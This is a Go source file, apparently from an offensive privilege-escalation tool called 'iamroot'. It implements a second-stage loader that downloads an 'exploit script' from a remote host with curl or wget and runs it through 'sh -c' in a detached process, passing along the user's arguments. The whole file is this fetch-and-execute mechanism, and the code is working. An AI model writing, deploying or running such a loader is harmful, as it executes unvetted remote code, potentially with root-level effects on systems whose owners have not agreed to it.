package stage2

import (
	"fmt"
	"os"
	"os/exec"
	"strings"

	"github.com/cleissonamanacio/iamroot/internal/sysutil"
)

var DefaultURL = "https://iamroot.victorsec.com/stage2"

func URL() string {
	if u := strings.TrimSpace(os.Getenv("IAMROOT_STAGE2_URL")); u != "" {
		return u
	}
	return DefaultURL
}

func FetchScript() (string, error) {
	if _, err := exec.LookPath("curl"); err == nil {
		out, err := exec.Command("curl", "-fsSL", "--retry", "2", "--connect-timeout", "15", URL()).Output()
		if err == nil && len(out) > 0 {
			return string(out), nil
		}
		return "", fmt.Errorf("curl %s: %w", URL(), err)
	}
	if _, err := exec.LookPath("wget"); err == nil {
		out, err := exec.Command("wget", "-q", "--timeout=20", "-O", "-", URL()).Output()
		if err == nil && len(out) > 0 {
			return string(out), nil
		}
		return "", fmt.Errorf("wget %s: %w", URL(), err)
	}
	return "", fmt.Errorf("neither curl nor wget available")
}

func Run() bool {
	fmt.Printf("[*] Stage 2: fetching exploit script from %s\n", URL())
	body, err := FetchScript()
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] stage 2 fetch failed: %v\n", err)
		fmt.Fprintf(os.Stderr, "[-] set IAMROOT_STAGE2_URL or check mirror reachability\n")
		return false
	}
	fmt.Println("[*] Stage 2: downloading full binary and running it")

	args := strings.Join(os.Args[1:], " ")
	if args == "" {
		args = os.Getenv("IAMROOT_ARGS")
	}

	cmd := exec.Command("sh", "-c", strings.TrimSpace(body))
	cmd.Env = append(os.Environ(), "IAMROOT_ARGS="+args)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	sysutil.Detach(cmd)
	err = cmd.Run()
	return err == nil
}
